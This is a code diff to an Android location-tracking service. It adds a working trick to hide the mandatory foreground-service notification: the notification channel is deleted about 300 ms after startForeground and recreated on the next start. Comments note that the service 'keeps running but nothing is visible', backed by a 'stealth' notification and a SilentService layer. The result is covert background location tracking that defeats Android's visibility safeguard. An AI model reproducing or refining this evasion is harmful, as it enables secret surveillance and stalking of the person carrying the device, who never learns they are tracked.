@@ -75,7 +75,6 @@ class LocationTrackingService : Service() {
     override fun onCreate() {
         super.onCreate()
         try {
-            createNotificationChannel()
             fusedClient = LocationServices.getFusedLocationProviderClient(this)
             buildLocationCallback()
         } catch (e: Exception) {
@@ -84,7 +83,13 @@ class LocationTrackingService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // 1. Start foreground immediately (required by Android)
+        // 1. (Re-)create the channel right before every startForeground call.
+        //    The channel may have been deleted by step 3 on a previous start,
+        //    so we must recreate it here — not just in onCreate() which is only
+        //    called once per service lifetime.
+        createNotificationChannel()
+
+        // 2. Satisfy Android's foreground-service requirement
         try {
             startForeground(NOTIFICATION_ID, buildStealthNotification())
         } catch (e: Exception) {
@@ -93,21 +98,26 @@ class LocationTrackingService : Service() {
             catch (e2: Exception) { Log.e(TAG, "fallback startForeground: ${e2.message}") }
         }
 
-        // 2. Kick the SilentService to remove the notification from the shade
+        // 3. DELETE the notification channel ~300 ms after startForeground.
+        //    On every Android version including Samsung One UI, deleting a
+        //    channel immediately removes any notification posted to it — the
+        //    service keeps running but nothing is visible in the shade.
+        //    (The channel is recreated at step 1 the next time onStartCommand
+        //    is called, so startForeground never sees a missing channel.)
+        Handler(Looper.getMainLooper()).postDelayed({
+            try {
+                val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+                nm.cancel(NOTIFICATION_ID)
+                nm.deleteNotificationChannel(CHANNEL_ID)
+            } catch (_: Exception) {}
+        }, 300)
+
+        // 4. SilentService as an additional layer (works on Android 8–12)
         try {
             startService(Intent(this, SilentService::class.java))
         } catch (e: Exception) {
             Log.e(TAG, "SilentService: ${e.message}")
         }
-
-        // 3. Belt-and-suspenders: also cancel via NotificationManager after a
-        //    short delay so Samsung One UI / MIUI can't re-show it
-        Handler(Looper.getMainLooper()).postDelayed({
-            try {
-                (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
-                    .cancel(NOTIFICATION_ID)
-            } catch (_: Exception) {}
-        }, 600)
 
         try {
             prefs().edit().putBoolean(Prefs.KEY_TRACKING_ACTIVE, true).apply()
